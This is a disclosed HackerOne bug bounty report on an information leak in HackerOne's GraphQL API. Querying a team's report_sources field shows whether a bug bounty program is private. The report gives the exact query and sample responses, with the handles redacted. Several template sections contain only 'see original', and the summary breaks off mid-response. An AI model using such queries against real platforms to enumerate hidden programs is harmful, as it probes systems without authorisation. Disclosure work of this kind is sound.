# Unauthorized user can obtain `report_sources` attribute through Team GraphQL object

## Metadata
- **Source:** HackerOne
- **Report:** 770209 | https://hackerone.com/reports/770209
- **Submitted:** 2020-01-08
- **Reporter:** haxta4ok00
- **Program:** Unknown
- **Bounty:** $2,500
- **Severity:** medium
- **Vuln:** Information Disclosure
- **CVEs:** None
- **Category:** web-api

## Summary
**Summary:**
Hi team. And Happy New Year!
**Description:**
If I am not mistaken, then through this parameter we can define private programs with an external link.

If this parameter is not empty, then the program is private. - `["HackerOne Platform"]`
### Steps To Reproduce

https://hackerone.com/graphql
POST:


1){"query": "query {team(handle:\\"████████\\"){_id,report_sources}}"}
`{"data":{"team

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Summary:**
Hi team. And Happy New Year!
**Description:**
If I am not mistaken, then through this parameter we can define private programs with an external link.

If this parameter is not empty, then the program is private. - `["HackerOne Platform"]`
### Steps To Reproduce

https://hackerone.com/graphql
POST:


1){"query": "query {team(handle:\\"████████\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"██████████","report_sources":[]}}}` - not private program

2){"query": "query {team(handle:\\"███\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"█████","report_sources":["HackerOne Platform"]}}}` - `["HackerOne Platform"]` - private program

3){"query": "query {team(handle:\\"█████████\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"█████████","report_sources":["HackerOne Platform"]}}}` - `["HackerOne Platform"]` - private program

4){"query": "query {team(handle:\\"█████\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"███","report_sources":[]}}}` - not private program

Sorry i bad speak english
I hope you understand me
Thank you,haxta4ok00

## Impact

disclosed of private programs who have external link

</details>

---
*Analysed by Claude on 2026-05-24*
